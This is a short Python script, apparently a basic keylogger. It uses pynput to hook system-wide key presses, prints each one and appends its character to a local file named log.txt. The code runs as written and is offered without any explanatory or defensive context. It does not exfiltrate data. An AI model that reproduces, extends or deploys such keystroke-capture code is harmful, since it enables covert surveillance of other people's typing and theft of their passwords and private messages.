from pynput import keyboard

def keyPressed(key):

    print(str(key))
    
    with open("log.txt", 'a') as file:
        try:
            char = key.char
            file.write(char)
        except:
            print("error logging key")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()